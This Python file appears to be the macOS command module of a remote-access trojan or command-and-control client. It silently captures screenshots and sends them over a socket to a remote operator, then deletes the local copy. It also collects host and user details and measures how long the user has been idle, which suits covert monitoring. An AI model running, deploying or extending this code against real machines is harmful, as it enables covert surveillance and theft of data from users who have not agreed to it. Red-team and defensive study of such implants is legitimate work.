import os
import subprocess
import sys
import time

from client.commands.CommonCommands import CommonCommands
from client.util.decorator import desc
from common.util import get_time, get_size, format_dict, logger, validate_required_args


class MacCommands(CommonCommands):

    def __init__(self, socket):
        super().__init__(socket)

    @desc("grab a screenshot")
    def screenshot(self):
        filename = 'screenshot_{}.png'.format(get_time())
        command = f"screencapture -x {filename}"
        self._send_interim_result(1, f'Preparing to execute command: {command}')
        os.system(command)
        if os.path.isfile(filename):
            self._send_interim_result(1, 'Screenshot success')
            self._send_interim_result(1, f'Preparing to send file, length is {get_size(os.path.getsize(filename))}')
            self.socket.send_file(self.command_id, filename)
            os.remove(filename)
        else:
            self._send_final_result(0, 'Screenshot failed')

    @desc('get information')
    def getinfo(self):
        info = {}
        try:
            import platform
            import psutil
            info['hostname'] = platform.node()
            info['os_version'] = platform.mac_ver()[0]  # 获取 macOS 版本
            info['os_build'] = subprocess.getoutput('sw_vers -buildVersion')  # 构建版本号
            info['arch'] = platform.machine()
            info['model'] = subprocess.getoutput('sysctl -n hw.model').strip()  # Mac 型号
            info['cpu_brand'] = subprocess.getoutput('sysctl -n machdep.cpu.brand_string').strip()
            info['cpu_cores'] = os.cpu_count()
            info['mem'] = f'{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB'
            info['python_ver'] = platform.python_version()
            info['pid'] = os.getpid()
            info['current_user'] = psutil.Process().username()
            executable = os.path.realpath(sys.executable)
            argv = os.path.realpath(''.join(sys.argv))
            info['exec_path'] = f'{executable} {argv}'
            info['process_uptime'] = f'{round(time.time() - psutil.Process().create_time(), 2)}s'
        except Exception as e:
            logger.error(e)
        finally:
            return 1, format_dict(info)

    @desc('detect user inactive time')
    def idletime(self):
        from Quartz import CGEventSourceSecondsSinceLastEventType, kCGEventSourceStateHIDSystemState, \
            kCGAnyInputEventType
        idle_time = CGEventSourceSecondsSinceLastEventType(
            kCGEventSourceStateHIDSystemState,
            kCGAnyInputEventType
        )
        return 1, 'User has been idle for: {} seconds'.format(idle_time)

